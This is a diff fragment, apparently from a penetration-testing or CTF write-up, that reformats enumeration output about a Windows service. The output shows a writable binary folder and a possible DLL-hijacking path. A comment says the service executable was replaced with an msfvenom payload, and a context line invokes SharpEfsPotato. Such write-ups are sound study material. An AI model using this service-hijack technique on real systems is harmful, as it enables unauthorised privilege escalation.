@@ -1517,12 +1517,12 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ## Services
 
-<aside>
-💡 <b>GPGOrchestrator</b>(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
-    YOU CAN MODIFY THIS SERVICE: AllAccess
-    File Permissions: Users [WriteData/CreateFiles]
-    Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])
-</aside>
+
+-💡 <b>GPGOrchestrator</b>(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
+- YOU CAN MODIFY THIS SERVICE: AllAccess
+- File Permissions: Users [WriteData/CreateFiles]
+- Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])
+
 
 ```powershell
 # Check the above information why I used GPGOrchestrator to start GPGService.exe, First i replaced the GPGService.exe with msfvenom payload.
